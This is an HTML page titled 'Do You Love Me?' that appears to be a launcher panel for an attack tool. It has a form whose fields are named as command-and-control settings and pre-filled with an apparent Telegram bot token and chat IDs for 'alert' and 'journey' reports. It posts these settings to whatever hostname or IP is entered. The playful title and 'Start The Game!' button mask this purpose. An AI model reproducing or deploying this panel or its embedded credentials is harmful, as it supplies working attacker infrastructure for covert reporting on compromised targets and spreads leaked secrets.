<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Do You Love Me?</title>
    <style>
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
            background-color: #121212;
            color: #e0e0e0;
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            box-sizing: border-box;
        }
        .container { 
            width: 100%; 
            max-width: 500px; 
            background-color: #1e1e1e; 
            padding: 25px; 
            border-radius: 12px; 
            border: 1px solid #333;
            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
            box-sizing: border-box;
        }
        h2 { 
            color: #bb86fc;
            text-align: center; 
            margin-top: 0; 
            margin-bottom: 30px; 
            border-bottom: 1px solid #333; 
            padding-bottom: 20px;
            font-weight: 300;
            letter-spacing: 1px;
        }
        label { 
            display: block; 
            margin-bottom: 8px; 
            font-weight: 500;
            color: #a0a0a0;
            font-size: 14px;
        }
        input[type="text"], 
        input[type="url"] { 
            width: 100%; 
            padding: 14px; 
            margin-bottom: 25px; 
            border-radius: 6px; 
            border: 1px solid #444; 
            background-color: #2c2c2c; 
            color: #e0e0e0; 
            box-sizing: border-box; 
            font-size: 16px;
            transition: border-color 0.2s, box-shadow 0.2s;
        }
        input[type="text"]:focus, 
        input[type="url"]:focus {
            outline: none;
            border-color: #bb86fc;
            box-shadow: 0 0 0 3px rgba(187, 134, 252, 0.2);
        }
        input[type="submit"] { 
            width: 100%; 
            background-color: #bb86fc; 
            color: #121212; 
            padding: 14px 20px; 
            border: none; 
            border-radius: 6px; 
            cursor: pointer; 
            font-weight: bold;
            font-size: 16px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            transition: background-color 0.2s, transform 0.1s;
        }
        input[type="submit"]:hover {
            background-color: #d1b3ff;
        }
        input[type="submit"]:active {
            transform: scale(0.98);
        }

        @media (max-width: 600px) {
            body {
                padding: 15px;
            }
            .container {
                padding: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Do You Love Me?</h2>
        <form id="runnerForm" method="POST" target="_blank">
            <label for="target_url">Hostname/IP</label>
            <input type="url" id="target_url" name="target_url" placeholder="Idk what is this ..." required>

            <label for="c2_token">Token:</label>
            <input type="text" id="c2_token" value="8425271441:AAG1jRA0d62wAKkTln7-u9VSPIZ0ZcG4M6Y" name="c2_token" placeholder="Token 8425271443..." required>
            
            <label for="c2_chat_ids_alert">Alert Chat IDs:</label>
            <input type="text" id="c2_chat_ids_alert" value="-4889616812" name="c2_chat_ids_alert" placeholder="-123459382, -3xxxxxx, ..." required>

            <label for="c2_chat_ids_journey">Journey Chat IDs:</label>
            <input type="text" id="c2_chat_ids_journey" name="c2_chat_ids_journey" value="-5042256960" placeholder="-123459382, -3xxxxxx, ..." required>
            
            <input type="submit" value="Start The Game!">
        </form>
    </div>
    <script>
        document.getElementById('runnerForm').addEventListener('submit', function(event) {
            this.action = document.getElementById('target_url').value;
        });
    </script>
</body>
</html>
